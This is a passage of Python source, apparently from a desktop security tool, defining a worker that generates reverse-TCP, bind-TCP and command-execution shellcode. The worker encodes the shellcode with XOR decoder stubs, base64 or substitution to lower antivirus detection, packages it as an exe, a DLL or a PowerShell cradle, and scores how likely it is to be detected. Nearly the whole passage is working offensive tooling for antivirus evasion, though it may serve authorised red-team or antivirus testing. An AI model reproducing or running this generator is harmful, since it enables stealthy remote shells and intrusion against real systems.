    decoder_instructions_size = 7 + 3 + 4

    total_stub_size = stub_prefix_size + decoder_instructions_size
    encoded_data = encoded_with_stub[total_stub_size:]

    # XOR decode
    decoded = bytearray(len(encoded_data))
    for i, byte in enumerate(encoded_data):
        decoded[i] = byte ^ key[i % key_length]

    return bytes(decoded)


def _base64_encode(shellcode: bytes) -> Tuple[bytes, None]:
    """
    Base64-encode shellcode.

    Returns:
        Tuple of (base64_encoded_bytes, None).
    """
    return base64.b64encode(shellcode), None


def _base64_decode(encoded: bytes) -> bytes:
    """Decode base64-encoded shellcode."""
    return base64.b64decode(encoded)


def _substitution_encode(shellcode: bytes) -> Tuple[bytes, None]:
    """
    Apply byte substitution encoding using a fixed rotation table.

    Returns:
        Tuple of (substituted_bytes, None).
    """
    encoded = bytes([_SUBSTITUTION_TABLE[b] for b in shellcode])
    return encoded, None


def _substitution_decode(encoded: bytes) -> bytes:
    """Decode byte-substitution-encoded shellcode."""
    return bytes([_REVERSE_SUBSTITUTION_TABLE[b] for b in encoded])


# =============================================================================
# Detection Score
# =============================================================================

def calculate_detection_score(payload: bytes, encoding_layers: int) -> int:
    """
    Calculate a detection likelihood score for the payload.

    Score formula:
    - Base score = 85 (raw shellcode with no encoding)
    - Each encoding layer reduces by 20
    - Unique byte ratio provides additional reduction (max 10)
    - Result clamped to [5, 100]
    - Monotonically decreasing with more layers (unique_bytes_ratio held constant)

    Args:
        payload: The encoded payload bytes.
        encoding_layers: Number of encoding passes applied (>= 0).

    Returns:
        Integer detection score 0-100.
    """
    base_score = 85

    # Calculate unique bytes ratio (0.0 to 1.0)
    if len(payload) > 0:
        unique_bytes = len(set(payload))
        unique_ratio = unique_bytes / 256.0  # Ratio of possible byte values used
    else:
        unique_ratio = 0.0

    # Score decreases with more encoding layers
    # Each layer reduces by 20 points
    layer_reduction = encoding_layers * 20

    # High entropy (more unique bytes) reduces score further (max 10 points)
    entropy_reduction = unique_ratio * 10

    score = base_score - layer_reduction - entropy_reduction

    # Clamp to valid range
    score = max(5, min(100, int(score)))

    return score


# =============================================================================
# PayloadGeneratorWorker
# =============================================================================

class PayloadGeneratorWorker(QRunnable):
    """
    QRunnable worker that generates AV evasion test payloads using pure Python.

    Produces architecture-specific shellcode via struct.pack(), applies
    configurable encoding (XOR, base64, substitution), and outputs in
    multiple formats (raw, exe, dll, powershell).

    No network access. No subprocess calls. Completes within 10 seconds.
    """

    def __init__(
        self,
        payload_type: str = "reverse_tcp",
        payload_format: str = "raw",
        architecture: str = None,
        encoding: str = "xor",
        lhost: str = "127.0.0.1",
        lport: int = 4444,
        staged: bool = False,
    ):
        super().__init__()
        self.signals = AVFWWorkerSignals()
        self.is_running = True

        self.payload_type = payload_type.lower().strip()
        self.payload_format = payload_format.lower().strip()
        # Default to x64 if not specified (Requirement 4.9)
        self.architecture = (architecture or "x64").lower().strip()
        self.encoding = encoding.lower().strip()
        self.lhost = lhost
        self.lport = lport
        self.staged = staged

        # XOR key length (default 16 bytes)
        self.xor_key_length = 16

    def run(self):
        """Execute payload generation."""
        try:
            self.signals.status.emit("Generating payload...")
            self.signals.progress_start.emit(4)  # 4 steps: validate, generate, encode, format

            # Step 1: Validate inputs
            if not self.is_running:
                self._emit_cancelled()
                return

            error = self._validate_inputs()
            if error:
                self.signals.output.emit(
                    f"<p style='color: {COLOR_ERROR};'>[ERROR] {h(error)}</p><br>"
                )
                self.signals.results_ready.emit({"error": error})
                self.signals.finished.emit()
                return

            self.signals.progress_update.emit(1, 0)

            # Step 2: Generate shellcode
            if not self.is_running:
                self._emit_cancelled()
                return

            self.signals.output.emit(
                f"<p style='color: {COLOR_INFO};'>[INFO] Generating {self.payload_type} "
                f"shellcode ({self.architecture})...</p><br>"
            )

            if self.staged:
                stager_bytes, main_bytes = self.generate_staged()
                shellcode = main_bytes  # Primary payload for encoding/formatting
            else:
                shellcode = self.generate_shellcode()
                stager_bytes = None

            self.signals.progress_update.emit(2, 0)

            # Step 3: Apply encoding
            if not self.is_running:
                self._emit_cancelled()
                return

            self.signals.output.emit(
                f"<p style='color: {COLOR_INFO};'>[INFO] Applying {self.encoding} encoding...</p><br>"
            )

            encoded_payload = self.apply_encoding(shellcode)
            encoding_layers = 1  # Single encoding pass

            self.signals.progress_update.emit(3, 0)

            # Step 4: Format output
            if not self.is_running:
                self._emit_cancelled()
                return

            self.signals.output.emit(
                f"<p style='color: {COLOR_INFO};'>[INFO] Formatting as {self.payload_format}...</p><br>"
            )

            formatted_output = self.format_output(encoded_payload)

            # Calculate detection score
            if isinstance(formatted_output, str):
                payload_for_score = formatted_output.encode("utf-8")
            else:
                payload_for_score = formatted_output

            detection_score = self.calculate_detection_score(payload_for_score, encoding_layers)

            self.signals.progress_update.emit(4, 1)

            # Build result
            if isinstance(formatted_output, str):
                payload_bytes = formatted_output.encode("utf-8")
            else:
                payload_bytes = formatted_output

            # Also encode stager if staged
            encoded_stager = None
            if stager_bytes is not None:
                encoded_stager = self.apply_encoding(stager_bytes)

            result = PayloadResult(
                payload_bytes=payload_bytes,
                stager_bytes=encoded_stager,
                format_used=self.payload_format,
                architecture=self.architecture,
                encoding_layers=encoding_layers,
                detection_score=detection_score,
                size_bytes=len(payload_bytes),
            )

            # Emit success
            self.signals.output.emit(
                f"<p style='color: {COLOR_SUCCESS};'>[SUCCESS] Payload generated: "
                f"{result.size_bytes} bytes, detection score: {result.detection_score}/100</p><br>"
            )

            if self.staged and encoded_stager:
                self.signals.output.emit(
                    f"<p style='color: {COLOR_SUCCESS};'>[SUCCESS] Stager: "
                    f"{len(encoded_stager)} bytes (connection logic only)</p><br>"
                )

            # Emit structured results
            results_dict = {
                "payload_type": self.payload_type,
                "payload_format": self.payload_format,
                "architecture": self.architecture,
                "encoding": self.encoding,
                "staged": self.staged,
                "size_bytes": result.size_bytes,
                "detection_score": result.detection_score,
                "encoding_layers": result.encoding_layers,
                "payload_bytes": result.payload_bytes,
                "stager_bytes": result.stager_bytes,
                "error": None,
            }
            self.signals.results_ready.emit(results_dict)
            self.signals.status.emit("Payload generation complete")
            self.signals.finished.emit()

        except Exception as e:
            logger.error(f"Payload generation error: {e}", exc_info=True)
            self.signals.output.emit(
                f"<p style='color: {COLOR_ERROR};'>[ERROR] Payload generation failed: "
                f"{h(str(e))}</p><br>"
            )
            self.signals.results_ready.emit({"error": str(e)})
            self.signals.finished.emit()

    def _validate_inputs(self) -> Optional[str]:
        """
        Validate payload configuration inputs.

        Returns:
            None if valid, or error message string.
        """
        if self.payload_type not in SUPPORTED_TYPES:
            return (
                f"Unsupported payload type: '{self.payload_type}'. "
                f"Supported types: {', '.join(SUPPORTED_TYPES)}"
            )

        if self.payload_format not in SUPPORTED_FORMATS:
            return (
                f"Unsupported payload format: '{self.payload_format}'. "
                f"Supported formats: {', '.join(SUPPORTED_FORMATS)}"
            )

        if self.architecture not in SUPPORTED_ARCHITECTURES:
            return (
                f"Unsupported architecture: '{self.architecture}'. "
                f"Supported architectures: {', '.join(SUPPORTED_ARCHITECTURES)}"
            )

        if self.encoding not in SUPPORTED_ENCODINGS:
            return (
                f"Unsupported encoding: '{self.encoding}'. "
                f"Supported encodings: {', '.join(SUPPORTED_ENCODINGS)}"
            )

        if not (1 <= self.lport <= 65535):
            return f"Invalid port: {self.lport} - must be between 1 and 65535"

        return None

    def generate_shellcode(self) -> bytes:
        """
        Generate architecture-appropriate shellcode for the configured payload type.

        Uses struct.pack() to embed IP/port into shellcode templates.

        Returns:
            Raw shellcode bytes.
        """
        generators = {
            ("reverse_tcp", "x64"): _generate_reverse_tcp_x64,
            ("reverse_tcp", "x86"): _generate_reverse_tcp_x86,
            ("bind_tcp", "x64"): _generate_bind_tcp_x64,
            ("bind_tcp", "x86"): _generate_bind_tcp_x86,
            ("cmd_exec", "x64"): _generate_cmd_exec_x64,
            ("cmd_exec", "x86"): _generate_cmd_exec_x86,
        }

        key = (self.payload_type, self.architecture)
        generator = generators.get(key)

        if generator is None:
            raise ValueError(
                f"No shellcode generator for type={self.payload_type}, "
                f"arch={self.architecture}"
            )

        return generator(self.lhost, self.lport)

    def apply_encoding(self, shellcode: bytes) -> bytes:
        """
        Apply the configured encoding to shellcode.

        Supported encodings:
        - xor: Random key (1-32 bytes) with decoder stub prepended
        - base64: Standard base64 encoding
        - substitution: Fixed byte rotation table

        Args:
            shellcode: Raw shellcode bytes to encode.

        Returns:
            Encoded bytes.
        """
        if self.encoding == "xor":
            encoded, _key = _xor_encode(shellcode, self.xor_key_length)
            return encoded
        elif self.encoding == "base64":
            encoded, _ = _base64_encode(shellcode)
            return encoded
        elif self.encoding == "substitution":
            encoded, _ = _substitution_encode(shellcode)
            return encoded
        else:
            # Fallback: return raw
            return shellcode

    def format_output(self, encoded: bytes) -> Union[bytes, str]:
        """
        Format encoded payload into the requested output format.

        Formats:
        - raw: Returns encoded bytes directly
        - exe: Wraps in minimal PE executable structure
        - dll: Wraps in minimal PE DLL with DllMain entry
        - powershell: Base64 cradle script (string)

        Args:
            encoded: Encoded shellcode bytes.

        Returns:
            Formatted payload as bytes (raw/exe/dll) or string (powershell).
        """
        if self.payload_format == "raw":
            return encoded
        elif self.payload_format == "exe":
            return _build_pe_exe(encoded, self.architecture)
        elif self.payload_format == "dll":
            return _build_pe_dll(encoded, self.architecture)
        elif self.payload_format == "powershell":
            return _build_powershell_cradle(encoded)
        else:
            return encoded

    def calculate_detection_score(self, payload: bytes, encoding_layers: int) -> int:
        """
        Calculate detection likelihood score.

        Delegates to module-level function for testability.

        Args:
            payload: The final payload bytes.
            encoding_layers: Number of encoding passes applied.

        Returns:
            Integer score 0-100, monotonically decreasing with more layers.
        """
        return calculate_detection_score(payload, encoding_layers)

    def generate_staged(self) -> Tuple[bytes, bytes]:
        """
        Generate staged payload: separate stager and main payload.

        The stager contains ONLY connection/download logic (socket + recv loop).
        The main payload contains ONLY execution logic (CreateProcess/WinExec).
        Neither component alone is functionally complete.

        Returns:
            Tuple of (stager_bytes, main_payload_bytes).
        """
        if self.architecture == "x64":
            stager = _generate_stager_x64(self.lhost, self.lport)
            main = _generate_main_payload_x64(self.payload_type, self.lhost, self.lport)
        else:
            stager = _generate_stager_x86(self.lhost, self.lport)
            main = _generate_main_payload_x86(self.payload_type, self.lhost, self.lport)

        return stager, main

    def _emit_cancelled(self):
        """Emit signals for a cancelled operation."""
        self.signals.output.emit(
            f"<p style='color: {COLOR_WARNING};'>[CANCELLED] Payload generation cancelled</p><br>"
        )
        self.signals.status.emit("Cancelled")
        self.signals.finished.emit()
